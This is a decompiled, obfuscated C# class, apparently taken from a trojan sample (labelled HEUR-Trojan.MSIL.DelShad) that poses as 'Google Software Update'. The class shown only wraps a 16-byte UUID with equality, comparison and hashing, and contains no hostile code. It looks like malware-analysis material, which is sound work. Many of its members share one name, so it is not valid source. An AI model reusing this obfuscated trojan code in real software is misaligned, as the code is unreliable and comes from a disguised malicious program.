// Decompiled with JetBrains decompiler
// Type: C3554254475.C3865851505
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace C3554254475
{
  public sealed class C3865851505 : IComparable<C3865851505>, IEquatable<C3865851505>
  {
    public const uint C3554254475 = 16;
    public static readonly C3865851505 C3554254475 = new C3865851505(false);
    private byte[] C3554254475 = (byte[]) null;
    private int C3554254475 = 0;

    [SpecialName]
    public byte[] C3554254475() => this.C3554254475;

    public C3865851505([In] bool obj0)
    {
      if (obj0)
        this.C3904355907();
      else
        this.C1255198513();
    }

    public C3865851505([In] byte[] obj0) => this.C3554254475(obj0);

    private void C3904355907()
    {
      Debug.Assert(this.C3554254475 == null);
      while (true)
      {
        this.C3554254475 = Guid.NewGuid().ToByteArray();
        if (this.C3554254475 != null && this.C3554254475.Length == 16)
        {
          if (this.Equals(C3865851505.C3554254475))
            Debug.Assert(false);
          else
            goto label_3;
        }
        else
          break;
      }
      Debug.Assert(false);
      throw new InvalidOperationException();
label_3:;
    }

    private void C3554254475([In] byte[] obj0)
    {
      Debug.Assert(obj0 != null && obj0.Length == 16);
      if (obj0 == null)
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C3664761504());
      if (obj0.Length != 16)
        throw new ArgumentException();
      Debug.Assert(this.C3554254475 == null);
      this.C3554254475 = new byte[16];
      Array.Copy((Array) obj0, (Array) this.C3554254475, 16);
    }

    private void C1255198513()
    {
      Debug.Assert(this.C3554254475 == null);
      this.C3554254475 = new byte[16];
      Debug.Assert(new List<byte>((IEnumerable<byte>) this.C3554254475).TrueForAll((Predicate<byte>) (obj0 => obj0 == (byte) 0)));
    }

    [Obsolete]
    public bool C3554254475([In] C3865851505 obj0) => this.Equals(obj0);

    public override bool Equals([In] object obj0) => this.Equals(obj0 as C3865851505);

    public bool Equals([In] C3865851505 obj0)
    {
      if (obj0 == null)
      {
        Debug.Assert(false);
        return false;
      }
      for (int index = 0; index < 16; ++index)
      {
        if ((int) this.C3554254475[index] != (int) obj0.C3554254475[index])
          return false;
      }
      return true;
    }

    public override int GetHashCode()
    {
      if (this.C3554254475 == 0)
        this.C3554254475 = (int) C2137352139.C3554254475(this.C3554254475, 0, this.C3554254475.Length);
      return this.C3554254475;
    }

    public int CompareTo([In] C3865851505 obj0)
    {
      if (obj0 == null)
      {
        Debug.Assert(false);
        throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.C3775001192());
      }
      for (int index = 0; index < 16; ++index)
      {
        if ((int) this.C3554254475[index] < (int) obj0.C3554254475[index])
          return -1;
        if ((int) this.C3554254475[index] > (int) obj0.C3554254475[index])
          return 1;
      }
      return 0;
    }

    public string C1908338681() => C2137352139.C3554254475(this.C3554254475);

    public override string ToString() => this.C1908338681();
  }
}
